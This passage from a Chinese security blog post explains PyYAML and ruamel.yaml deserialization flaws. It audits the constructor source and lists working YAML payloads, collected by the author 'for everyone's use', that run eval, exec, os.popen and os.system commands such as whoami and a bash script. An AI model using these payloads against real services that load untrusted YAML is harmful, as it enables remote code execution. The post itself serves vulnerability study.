<pre><code class="hljs scss"><span class="hljs-selector-attr">[&lt;class <span class="hljs-string">'ArithmeticError'</span>&gt;, &lt;class <span class="hljs-string">'AssertionError'</span>&gt;, &lt;class <span class="hljs-string">'AttributeError'</span>&gt;, &lt;class <span class="hljs-string">'BaseException'</span>&gt;, &lt;class <span class="hljs-string">'BlockingIOError'</span>&gt;, &lt;class <span class="hljs-string">'BrokenPipeError'</span>&gt;, &lt;class <span class="hljs-string">'BufferError'</span>&gt;, &lt;class <span class="hljs-string">'BytesWarning'</span>&gt;, &lt;class <span class="hljs-string">'ChildProcessError'</span>&gt;, &lt;class <span class="hljs-string">'ConnectionAbortedError'</span>&gt;, &lt;class <span class="hljs-string">'ConnectionError'</span>&gt;, &lt;class <span class="hljs-string">'ConnectionRefusedError'</span>&gt;, &lt;class <span class="hljs-string">'ConnectionResetError'</span>&gt;, &lt;class <span class="hljs-string">'DeprecationWarning'</span>&gt;, &lt;class <span class="hljs-string">'EOFError'</span>&gt;, &lt;class <span class="hljs-string">'OSError'</span>&gt;, &lt;class <span class="hljs-string">'Exception'</span>&gt;, &lt;class <span class="hljs-string">'FileExistsError'</span>&gt;, &lt;class <span class="hljs-string">'FileNotFoundError'</span>&gt;, &lt;class <span class="hljs-string">'FloatingPointError'</span>&gt;, &lt;class <span class="hljs-string">'FutureWarning'</span>&gt;, &lt;class <span class="hljs-string">'GeneratorExit'</span>&gt;, &lt;class <span class="hljs-string">'OSError'</span>&gt;, &lt;class <span class="hljs-string">'ImportError'</span>&gt;, &lt;class <span class="hljs-string">'ImportWarning'</span>&gt;, &lt;class <span class="hljs-string">'IndentationError'</span>&gt;, &lt;class <span class="hljs-string">'IndexError'</span>&gt;, &lt;class <span class="hljs-string">'InterruptedError'</span>&gt;, &lt;class <span class="hljs-string">'IsADirectoryError'</span>&gt;, &lt;class <span class="hljs-string">'KeyError'</span>&gt;, &lt;class <span class="hljs-string">'KeyboardInterrupt'</span>&gt;, &lt;class <span class="hljs-string">'LookupError'</span>&gt;, &lt;class <span class="hljs-string">'MemoryError'</span>&gt;, &lt;class <span class="hljs-string">'ModuleNotFoundError'</span>&gt;, &lt;class <span class="hljs-string">'NameError'</span>&gt;, &lt;class <span class="hljs-string">'NotADirectoryError'</span>&gt;, &lt;class <span class="hljs-string">'NotImplementedError'</span>&gt;, &lt;class <span class="hljs-string">'OSError'</span>&gt;, &lt;class <span class="hljs-string">'OverflowError'</span>&gt;, &lt;class <span class="hljs-string">'PendingDeprecationWarning'</span>&gt;, &lt;class <span class="hljs-string">'PermissionError'</span>&gt;, &lt;class <span class="hljs-string">'ProcessLookupError'</span>&gt;, &lt;class <span class="hljs-string">'RecursionError'</span>&gt;, &lt;class <span class="hljs-string">'ReferenceError'</span>&gt;, &lt;class <span class="hljs-string">'ResourceWarning'</span>&gt;, &lt;class <span class="hljs-string">'RuntimeError'</span>&gt;, &lt;class <span class="hljs-string">'RuntimeWarning'</span>&gt;, &lt;class <span class="hljs-string">'StopAsyncIteration'</span>&gt;, &lt;class <span class="hljs-string">'StopIteration'</span>&gt;, &lt;class <span class="hljs-string">'SyntaxError'</span>&gt;, &lt;class <span class="hljs-string">'SyntaxWarning'</span>&gt;, &lt;class <span class="hljs-string">'SystemError'</span>&gt;, &lt;class <span class="hljs-string">'SystemExit'</span>&gt;, &lt;class <span class="hljs-string">'TabError'</span>&gt;, &lt;class <span class="hljs-string">'TimeoutError'</span>&gt;, &lt;class <span class="hljs-string">'TypeError'</span>&gt;, &lt;class <span class="hljs-string">'UnboundLocalError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeDecodeError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeEncodeError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeTranslateError'</span>&gt;, &lt;class <span class="hljs-string">'UnicodeWarning'</span>&gt;, &lt;class <span class="hljs-string">'UserWarning'</span>&gt;, &lt;class <span class="hljs-string">'ValueError'</span>&gt;, &lt;class <span class="hljs-string">'Warning'</span>&gt;, &lt;class <span class="hljs-string">'OSError'</span>&gt;, &lt;class <span class="hljs-string">'ZeroDivisionError'</span>&gt;, &lt;class <span class="hljs-string">'_frozen_importlib.BuiltinImporter'</span>&gt;, &lt;class <span class="hljs-string">'bool'</span>&gt;, &lt;class <span class="hljs-string">'bytearray'</span>&gt;, &lt;class <span class="hljs-string">'bytes'</span>&gt;, &lt;class <span class="hljs-string">'classmethod'</span>&gt;, &lt;class <span class="hljs-string">'complex'</span>&gt;, &lt;class <span class="hljs-string">'dict'</span>&gt;, &lt;class <span class="hljs-string">'enumerate'</span>&gt;, &lt;class <span class="hljs-string">'filter'</span>&gt;, &lt;class <span class="hljs-string">'float'</span>&gt;, &lt;class <span class="hljs-string">'frozenset'</span>&gt;, &lt;class <span class="hljs-string">'int'</span>&gt;, &lt;class <span class="hljs-string">'list'</span>&gt;, &lt;class <span class="hljs-string">'map'</span>&gt;, &lt;class <span class="hljs-string">'memoryview'</span>&gt;, &lt;class <span class="hljs-string">'object'</span>&gt;, &lt;class <span class="hljs-string">'property'</span>&gt;, &lt;class <span class="hljs-string">'range'</span>&gt;, &lt;class <span class="hljs-string">'reversed'</span>&gt;, &lt;class <span class="hljs-string">'set'</span>&gt;, &lt;class <span class="hljs-string">'slice'</span>&gt;, &lt;class <span class="hljs-string">'staticmethod'</span>&gt;, &lt;class <span class="hljs-string">'str'</span>&gt;, &lt;class <span class="hljs-string">'super'</span>&gt;, &lt;class <span class="hljs-string">'tuple'</span>&gt;, &lt;class <span class="hljs-string">'type'</span>&gt;, &lt;class <span class="hljs-string">'zip'</span>&gt;]</span></code></pre>
<p>现在就是找可以利用的类了，继续回到我们的constructor.py中，进一步审计 construct_python_object_apply()时，发现了一个漏洞点</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323210251975.png" alt="image-20240323210251975"></p>
<p>如果listitems不为空，则调用instance的extend()方法，将listitems中的所有元素添加到instance列表对象的末尾，instance是我们创建的实例，这里并没有定义listitems是什么，如果我们的listitems是一个字典，而且其内容有"{‘extend’:function}"，这样的话，我们就可以利用extend进行任意函数的执行了。</p>
<p>但是，经过测试，发现上面builtins中的这些类中，只有frozenset，bytes，tuple这三个类可以进行命令执行，为了搞清楚为什么，我们继续审计源码。</p>
<p>我们接着看make_python_instance()，</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323210433928.png" alt="image-20240323210433928"></p>
<p>这里只要我们的内置类可以执行<code>cls.__new__(cls, *args, **kwds)</code>这段代码，就可以根据参数来动态创建新的Python对象，从而进行命令执行。</p>
<p>所以猜测frozenset，bytes，tuple应该是可以执行上述代码，所以可以进行命令执行的</p>
<h4 id="payload">payload</h4>
<pre><code class="hljs scss">!!python/<span class="hljs-selector-tag">object</span>/new:bytes  
        - !!python/object/new:map  
          - !!python/name:eval  
          - [<span class="hljs-string">"__import__\x28'pickle'\x29.load\x28open\x28'fileinfo/pik','rb'\x29\x29"</span>]
          
          
!!python/object/new:frozenset  
- !!python/object/new:map  
  - !!python/name:os.popen  
  - [<span class="hljs-string">"bash /app/fileinfo/cmd"</span>]
  
  
!!python/object/new:tuple  
        - !!python/object/new:map  
          - !!python/name:eval  
          - [<span class="hljs-string">"print(123)"</span>]</code></pre>
<p>发现都是有回显的，这里顺便附上一些文章找到的payload，供大家使用:</p>
<pre><code class="hljs scss">#报错但是执行了
- !!python/<span class="hljs-selector-tag">object</span>/new:str
    args: []
    state: !!python/tuple
    - <span class="hljs-string">"__import__('os').system('whoami')"</span>
    - !!python/object/new:staticmethod
      args: [<span class="hljs-number">0</span>]
      state:
        update: !!python/name:exec
        
        
- !!python/object/new:yaml.MappingNode
  listitems: !!str <span class="hljs-string">'!!python/object/apply:subprocess.Popen [whoami]'</span>
  state:
    tag: !!str dummy
    value: !!str dummy
    extend: !!python/name:yaml.unsafe_load
    
    
#创建了一个类型为z的新对象,而对象中extend属性在创建时会被调用,参数为listitems内的参数
!!python/object/new:type
  args: [<span class="hljs-string">"z"</span>, !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: <span class="hljs-string">"__import__('os').system('whoami')"</span></code></pre>
<p>我们可以用python的内置函数<code>eval</code>（或者<code>exec</code>）来执行代码，用<code>map</code>来触发函数执行，用<code>tuple</code>将map对象转化为元组输出来（当然用<code>list</code>、<code>frozenset</code>、<code>bytes</code>都可以），用python写出来如下</p>
<pre><code class="hljs python"><span class="hljs-built_in">tuple</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">eval</span>, [<span class="hljs-string">"__import__('os').system('whoami')"</span>]))</code></pre>
<p>变为yaml</p>
<pre><code class="hljs yaml"><span class="hljs-string">yaml.load("""</span>
<span class="hljs-type">!!python/object/new:tuple</span>
<span class="hljs-bullet">-</span> <span class="hljs-type">!!python/object/new:map</span>
  <span class="hljs-bullet">-</span> <span class="hljs-type">!!python/name:eval</span>
  <span class="hljs-bullet">-</span> [<span class="hljs-string">"__import__('os').system('whoami')"</span>]
<span class="hljs-string">""</span><span class="hljs-string">")</span></code></pre>
<p>PS:</p>
<blockquote>
<blockquote>
<p>当利用上述payload测试到5.2b1版本时，发现无法利用针对!!python/object/apply标签的payload了，别的都可以利用</p>
<p>上述payload当我测试到5.4b1版本时，发现只有利用<code>针对!!python/name标签</code>的payload可以命令执行，别的payload都不能用了</p>
</blockquote>
<p>一些高版本的绕过方式，由于不是很常见，这里就不多介绍了</p>
</blockquote>
<p>当版本大于等于5.3.1:<a target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/pull/386">Prevents arbitrary code execution during python/object/new constructor by ret2libc · Pull Request #386 · yaml/pyyaml · GitHub</a></p>
<p>当版本大于等于6.0:<a target="_blank" rel="noopener" href="https://github.com/yaml/pyyaml/pull/386">Prevents arbitrary code execution during python/object/new constructor by ret2libc · Pull Request #386 · yaml/pyyaml · GitHub</a></p>
<h2 id="利用ruamelyaml读写yaml文件">利用ruamel.yaml读写yaml文件</h2>
<p>在网上搜资料的时候，发现了也可以利用ruamel.yaml读写yaml文件，所以我在想，是不是也存在PyYaml反序列化漏洞，进行测试一下。</p>
<p>这里还是沿用PyYaml&gt;5.1的poc</p>
<pre><code class="hljs py"><span class="hljs-keyword">import</span> ruamel.yaml

poc= <span class="hljs-string">b"""!!python/object/apply:os.system</span>
<span class="hljs-string">- calc"""</span>

ruamel.yaml.load(poc)<span class="hljs-comment">#py2下运行</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240323213632644.png" alt="image-20240323213632644"></p>
<h1 id="0x05-参考文章">0x05 参考文章</h1>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/damoxilai/p/16707055.html">PyYAML反序列化漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7923?time__1311=n4%2BxnD0G0%3DeQwqmTe05%2Bb8e4D5i%3DrzD9YbDYwD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-5">浅谈PyYAML反序列化漏洞</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/12481?time__1311=mqmhD5AKYIeUhDBqDTCgFTH%2BQ8D8IYeD&amp;alichlgref=https%3A%2F%2Fwww.google.com%2F#toc-6">PyYaml反序列化漏洞详解</a></p>
<p><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2022/06/06/SecMap-unserialize-pyyaml/#pythonname">SecMap - 反序列化（PyYAML） </a></p>

<div class="article-footer fs14">
    <section id="license">
      <div class="header"><span>许可协议</span></div>
      <div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
</div>
    </section>
    </div>
</article>
<div class="related-wrap" id="read-next"><section class="body"><div class="item" id="prev"><div class="note">较新文章</div><a href="/2024/03/24/metasploit-xue-xi-2/">Metasploit学习2</a></div><div class="item" id="next"><div class="note">较早文章</div><a href="/2024/03/23/metasploit-xue-xi/">Metasploit学习</a></div></section></div>




  <div class="related-wrap md-text" id="comments">
    <section class='header cmt-title cap theme'>
      <p>感谢大佬们的不吝赐教！</p>

    </section>
    <section class='body cmt-body twikoo'>
      

<div id="twikoo_container"><svg class="loading" style="vertical-align:middle;fill:currentColor;overflow:hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
    </section>
  </div>



<footer class="page-footer footnote"><hr><div class="text"><p><span id="busuanzi_container_site_pv">本站总访问量<span id="busuanzi_value_site_pv"></span>次</span></p>
<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
<p>本站由 <a href="/">hybcx</a> 使用 <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.28.1">Stellar 1.28.1</a> 主题创建。<br>
本博客所有文章除特别声明外，均采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议，转载请注明出处。</p>
</div></footer>
<div class="main-mask" onclick="sidebar.dismiss()"></div></div><aside class="l_right">
<div class="widgets">



<widget class="widget-wrapper toc" id="data-toc" collapse="true"><div class="widget-header dis-select"><span class="name">本文目录</span><a class="cap-action" onclick="sidebar.toggleTOC()" ><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg></a></div><div class="widget-body"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-ymal%E7%AE%80%E4%BB%8B"><span class="toc-text">0x01 YMAL简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-yaml%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95"><span class="toc-text">0x02 Yaml基本语法</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-yaml%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E4%B8%8E%E7%BB%93%E6%9E%84"><span class="toc-text">0x03 Yaml数据类型与结构</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">0x04 反序列化漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pyyamllt51"><span class="toc-text">PyYaml&lt;&#x3D;5.1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#yaml-gtpython"><span class="toc-text">yaml-&gt;python</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#python-gtyaml"><span class="toc-text">python-&gt;yaml</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0rce"><span class="toc-text">漏洞成因–RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonobject%E6%A0%87%E7%AD%BE"><span class="toc-text">!!python&#x2F;object标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonobjectapply%E6%A0%87%E7%AD%BE"><span class="toc-text">!!python&#x2F;object&#x2F;apply标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonobjectnew%E6%A0%87%E7%AD%BE"><span class="toc-text">!!python&#x2F;object&#x2F;new标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonmodule%E6%A0%87%E7%AD%BE"><span class="toc-text">!!python&#x2F;module标签</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonname%E6%A0%87%E7%AD%BE"><span class="toc-text">!!python&#x2F;name标签</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%901"><span class="toc-text">调试分析1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%902"><span class="toc-text">调试分析2</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E6%80%BB%E7%BB%93"><span class="toc-text">payload总结</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="toc-text">漏洞成因–文件上传</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pythonmodule%E6%A0%87%E7%AD%BE"><span class="toc-text">!!python&#x2F;module标签</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BF%AE%E5%A4%8D"><span class="toc-text">漏洞修复</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pyyamlgt51"><span class="toc-text">PyYaml&gt;5.1</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pyyamllt51%E7%9A%84poc"><span class="toc-text">PyYaml&lt;&#x3D;5.1的poc</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#builtins%E6%A8%A1%E5%9D%97%E4%B8%AD%E7%9A%84%E5%86%85%E7%BD%AE%E5%87%BD%E6%95%B0"><span class="toc-text">builtins模块中的内置函数</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#payload"><span class="toc-text">payload</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8ruamelyaml%E8%AF%BB%E5%86%99yaml%E6%96%87%E4%BB%B6"><span class="toc-text">利用ruamel.yaml读写yaml文件</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E5%8F%82%E8%80%83%E6%96%87%E7%AB%A0"><span class="toc-text">0x05 参考文章</span></a></li></ol></div><div class="widget-footer">

<a class="top" onclick="util.scrollTop()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 12c0-4.714 0-7.071 1.464-8.536C4.93 2 7.286 2 12 2c4.714 0 7.071 0 8.535 1.464C22 4.93 22 7.286 22 12c0 4.714 0 7.071-1.465 8.535C19.072 22 16.714 22 12 22s-7.071 0-8.536-1.465C2 19.072 2 16.714 2 12Z"/><path stroke-linecap="round" stroke-linejoin="round" d="m9 15.5l3-3l3 3m-6-4l3-3l3 3"/></g></svg><span>回到顶部</span></a><a class="buttom" onclick="util.scrollComment()"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M10.46 1.25h3.08c1.603 0 2.86 0 3.864.095c1.023.098 1.861.3 2.6.752a5.75 5.75 0 0 1 1.899 1.899c.452.738.654 1.577.752 2.6c.095 1.004.095 2.261.095 3.865v1.067c0 1.141 0 2.036-.05 2.759c-.05.735-.153 1.347-.388 1.913a5.75 5.75 0 0 1-3.112 3.112c-.805.334-1.721.408-2.977.43a10.81 10.81 0 0 0-.929.036c-.198.022-.275.054-.32.08c-.047.028-.112.078-.224.232c-.121.166-.258.396-.476.764l-.542.916c-.773 1.307-2.69 1.307-3.464 0l-.542-.916a10.605 10.605 0 0 0-.476-.764c-.112-.154-.177-.204-.224-.232c-.045-.026-.122-.058-.32-.08c-.212-.023-.49-.03-.93-.037c-1.255-.021-2.171-.095-2.976-.429A5.75 5.75 0 0 1 1.688 16.2c-.235-.566-.338-1.178-.389-1.913c-.049-.723-.049-1.618-.049-2.76v-1.066c0-1.604 0-2.86.095-3.865c.098-1.023.3-1.862.752-2.6a5.75 5.75 0 0 1 1.899-1.899c.738-.452 1.577-.654 2.6-.752C7.6 1.25 8.857 1.25 10.461 1.25M6.739 2.839c-.914.087-1.495.253-1.959.537A4.25 4.25 0 0 0 3.376 4.78c-.284.464-.45 1.045-.537 1.96c-.088.924-.089 2.11-.089 3.761v1c0 1.175 0 2.019.046 2.685c.045.659.131 1.089.278 1.441a4.25 4.25 0 0 0 2.3 2.3c.515.214 1.173.294 2.429.316h.031c.398.007.747.013 1.037.045c.311.035.616.104.909.274c.29.17.5.395.682.645c.169.232.342.525.538.856l.559.944a.52.52 0 0 0 .882 0l.559-.944c.196-.331.37-.624.538-.856c.182-.25.392-.476.682-.645c.293-.17.598-.24.909-.274c.29-.032.639-.038 1.037-.045h.032c1.255-.022 1.913-.102 2.428-.316a4.25 4.25 0 0 0 2.3-2.3c.147-.352.233-.782.278-1.441c.046-.666.046-1.51.046-2.685v-1c0-1.651 0-2.837-.089-3.762c-.087-.914-.253-1.495-.537-1.959a4.25 4.25 0 0 0-1.403-1.403c-.464-.284-1.045-.45-1.96-.537c-.924-.088-2.11-.089-3.761-.089h-3c-1.651 0-2.837 0-3.762.089" clip-rule="evenodd"/><path fill="currentColor" d="M9 11a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0m4 0a1 1 0 1 1-2 0a1 1 0 0 1 2 0"/></svg><span>参与讨论</span></a></div></widget>
</div></aside><div class='float-panel blur'>
  <button type='button' style='display:none' class='laptop-only rightbar-toggle mobile' onclick='sidebar.rightbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M10 6h11m-11 6h11m-11 6h11M4 6h1v4m-1 0h2m0 8H4c0-1 2-2 2-3s-1-1.5-2-1"/></svg>
  </button>
  <button type='button' style='display:none' class='mobile-only leftbar-toggle mobile' onclick='sidebar.leftbar()'>
    <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-width="1.5"><path d="M2 11c0-3.771 0-5.657 1.172-6.828C4.343 3 6.229 3 10 3h4c3.771 0 5.657 0 6.828 1.172C22 5.343 22 7.229 22 11v2c0 3.771 0 5.657-1.172 6.828C19.657 21 17.771 21 14 21h-4c-3.771 0-5.657 0-6.828-1.172C2 18.657 2 16.771 2 13z"/><path id="sep" stroke-linecap="round" d="M5.5 10h6m-5 4h4m4.5 7V3"/></g></svg>
  </button>
</div>
</div><div class="scripts">
<script type="text/javascript">
  const ctx = {
    date_suffix: {
      just: `刚刚`,
      min: `分钟前`,
      hour: `小时前`,
      day: `天前`,
    },
    root : `/`,
  };

  // required plugins (only load if needs)
  if (`local_search`) {
    ctx.search = {};
    ctx.search.service = `local_search`;
    if (ctx.search.service == 'local_search') {
      let service_obj = Object.assign({}, `{"field":"all","path":"/search.json","content":true,"sort":"-date"}`);
      ctx.search[ctx.search.service] = service_obj;
    }
  }
  const def = {
    avatar: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/3442075.svg`,
    cover: `https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/cover/76b86c0226ffd.svg`,
  };
  const deps = {
    jquery: `https://cdn.bootcdn.net/ajax/libs/jquery/3.7.1/jquery.min.js`,
    marked: `https://cdn.bootcdn.net/ajax/libs/marked/4.0.18/marked.min.js`
  }
  

</script>

<script type="text/javascript">
  const utils = {
    // 懒加载 css https://github.com/filamentgroup/loadCSS
    css: (href, before, media, attributes) => {
      var doc = window.document;
      var ss = doc.createElement("link");
      var ref;
      if (before) {
        ref = before;
      } else {
        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
        ref = refs[refs.length - 1];
      }
      var sheets = doc.styleSheets;
      if (attributes) {
        for (var attributeName in attributes) {
          if (attributes.hasOwnProperty(attributeName)) {
            ss.setAttribute(attributeName, attributes[attributeName]);
          }
        }
      }
      ss.rel = "stylesheet";
      ss.href = href;
      ss.media = "only x";
      function ready(cb) {
        if (doc.body) {
          return cb();
        }
        setTimeout(function () {
          ready(cb);
        });
      }
      ready(function () {
        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
      });
      var onloadcssdefined = function (cb) {
        var resolvedHref = ss.href;
        var i = sheets.length;
        while (i--) {
          if (sheets[i].href === resolvedHref) {
            return cb();
          }
        }
        setTimeout(function () {
          onloadcssdefined(cb);
        });
      };
      function loadCB() {
        if (ss.addEventListener) {
          ss.removeEventListener("load", loadCB);
        }
        ss.media = media || "all";
      }
      if (ss.addEventListener) {
        ss.addEventListener("load", loadCB);
      }
      ss.onloadcssdefined = onloadcssdefined;
      onloadcssdefined(loadCB);
      return ss;
    },

    js: (src, opt) => new Promise((resolve, reject) => {
      var script = document.createElement('script');
      if (src.startsWith('/')){
        src = ctx.root + src.substring(1);
      }
      script.src = src;
      if (opt) {
        for (let key of Object.keys(opt)) {
          script[key] = opt[key]
        }
      } else {
        // 默认异步，如果需要同步，第二个参数传入 {} 即可
        script.async = true
      }
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    }),

    jq: (fn) => {
      if (typeof jQuery === 'undefined') {
        utils.js(deps.jquery).then(fn)
      } else {
        fn()
      }
    },
    
    onLoading: (el) => {
      if (el) {
        $(el).append('<div class="loading-wrap"><svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" stroke-opacity=".3" d="M12 3C16.9706 3 21 7.02944 21 12C21 16.9706 16.9706 21 12 21C7.02944 21 3 16.9706 3 12C3 7.02944 7.02944 3 12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="1.3s" values="60;0"/></path><path stroke-dasharray="15" stroke-dashoffset="15" d="M12 3C16.9706 3 21 7.02944 21 12"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.3s" values="15;0"/><animateTransform attributeName="transform" dur="1.5s" repeatCount="indefinite" type="rotate" values="0 12 12;360 12 12"/></path></g></svg></div>');
      }
    },
    onLoadSuccess: (el) => {
      if (el) {
        $(el).find('.loading-wrap').remove();
      }
    },
    onLoadFailure: (el) => {
      if (el) {
        $(el).find('.loading-wrap svg').remove();
        $(el).find('.loading-wrap').append('<svg xmlns="http://www.w3.org/2000/svg" width="2em" height="2em" preserveAspectRatio="xMidYMid meet" viewBox="0 0 24 24"><g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"><path stroke-dasharray="60" stroke-dashoffset="60" d="M12 3L21 20H3L12 3Z"><animate fill="freeze" attributeName="stroke-dashoffset" dur="0.5s" values="60;0"/></path><path stroke-dasharray="6" stroke-dashoffset="6" d="M12 10V14"><animate fill="freeze" attributeName="stroke-dashoffset" begin="0.6s" dur="0.2s" values="6;0"/></path></g><circle cx="12" cy="17" r="1" fill="currentColor" fill-opacity="0"><animate fill="freeze" attributeName="fill-opacity" begin="0.8s" dur="0.4s" values="0;1"/></circle></svg>');
        $(el).find('.loading-wrap').addClass('error');
      }
    },
    request: (el, url, callback, onFailure) => {
      let retryTimes = 3;
      utils.onLoading(el);
      function req() {
        return new Promise((resolve, reject) => {
          let status = 0; // 0 等待 1 完成 2 超时
          let timer = setTimeout(() => {
            if (status === 0) {
              status = 2;
              timer = null;
              reject('请求超时');
              if (retryTimes == 0) {
                onFailure();
              }
            }
          }, 5000);
          fetch(url).then(function(response) {
            if (status !== 2) {
              clearTimeout(timer);
              resolve(response);
              timer = null;
              status = 1;
            }
            if (response.ok) {
              return response.json();
            }
